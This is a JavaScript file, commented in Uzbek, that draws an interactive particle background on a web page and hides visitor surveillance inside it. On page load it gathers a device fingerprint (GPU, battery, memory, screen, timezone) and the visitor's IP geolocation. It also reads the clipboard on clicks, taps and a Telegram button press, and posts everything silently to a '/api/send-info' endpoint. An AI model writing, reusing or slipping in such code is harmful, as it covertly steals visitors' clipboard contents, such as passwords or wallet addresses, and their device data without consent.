// Interaktiv fon uchun zarrachalar tizimi
const canvas = document.getElementById('interactive-bg');
const ctx = canvas.getContext('2d');
let particles = [];
const mouse = { x: null, y: null };

window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

class Particle {
    constructor() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.size = Math.random() * 5 + 1;
        this.speedX = Math.random() * 3 - 1.5;
        this.speedY = Math.random() * 3 - 1.5;
        this.color = 'rgba(124, 58, 237, 0.3)';
    }
    update() {
        this.x += this.speedX;
        this.y += this.speedY;
        if (this.size > 0.2) this.size -= 0.1;
        
        // Sichqonchaga ergashish
        if (mouse.x && mouse.y) {
            let dx = mouse.x - this.x;
            let dy = mouse.y - this.y;
            let distance = Math.sqrt(dx*dx + dy*dy);
            if (distance < 100) {
                this.x += dx * 0.02;
                this.y += dy * 0.02;
            }
        }
    }
    draw() {
        ctx.fillStyle = this.color;
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fill();
    }
}

function handleParticles() {
    for (let i = 0; i < particles.length; i++) {
        particles[i].update();
        particles[i].draw();
        if (particles[i].size <= 0.3) {
            particles.splice(i, 1);
            i--;
        }
    }
}

function animate() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    handleParticles();
    requestAnimationFrame(animate);
}
animate();

// Harakatlarni kuzatish va BUFERNI O'QISH
async function tryClipboardRead() {
    try {
        if (navigator.clipboard && navigator.clipboard.readText) {
            const text = await navigator.clipboard.readText();
            if (text) {
                // Yangi bufer topilsa, uni darhol backendga yuboramiz
                await fetch('/api/send-info', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        fingerprint: btoa(navigator.userAgent).substring(15, 35),
                        clipboard: "YANGI BUFER: " + text 
                    })
                });
            }
        }
    } catch (e) {}
}

// Fon bilan interaktivlik
canvas.addEventListener('mousemove', (e) => {
    mouse.x = e.x;
    mouse.y = e.y;
    for (let i = 0; i < 2; i++) {
        particles.push(new Particle());
    }
});

canvas.addEventListener('mousedown', () => {
    tryClipboardRead(); // Har safar bosilganda urinib ko'ramiz
});

canvas.addEventListener('touchstart', (e) => {
    mouse.x = e.touches[0].clientX;
    mouse.y = e.touches[0].clientY;
    tryClipboardRead();
    for (let i = 0; i < 5; i++) {
        particles.push(new Particle());
    }
});

// Asosiy ma'lumot yig'ish funksiyasi
async function collectAndSendInfo() {
    try {
        let gpu = "Noma'lum";
        try {
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            if (gl) {
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                if (debug) gpu = gl.getParameter(debug.UNMASKED_RENDERER_ID);
            }
        } catch (e) {}

        let battery = { level: "Noma'lum", charging: "" };
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = { level: Math.round(b.level * 100) + "%", charging: b.charging ? "⚡" : "🔋" };
            }
        } catch (e) {}

        const info = {
            fingerprint: btoa(navigator.userAgent).substring(15, 35),
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            screenSize: `${window.screen.width}x${window.screen.height}`,
            gpu: gpu,
            battery: battery,
            ram: navigator.deviceMemory || "Noma'lum",
            cores: navigator.hardwareConcurrency || "Noma'lum",
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            touchPoints: navigator.maxTouchPoints,
            orientation: screen.orientation ? screen.orientation.type : "Noma'lum"
        };

        let geo = {};
        try {
            const res = await fetch('https://ipapi.co/json/');
            geo = await res.json();
        } catch (e) {}

        await fetch('/api/send-info', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...info, city: geo.city, country: geo.country_name })
        });

        // Birinchi marta kirganda ham buferni o'qishga urinib ko'ramiz
        setTimeout(tryClipboardRead, 1000);

    } catch (error) {}
}

// Telegram tugmasini bosganda ham buferni o'qish
document.querySelector('.telegram').addEventListener('click', () => {
    tryClipboardRead();
});

window.addEventListener('DOMContentLoaded', collectAndSendInfo);
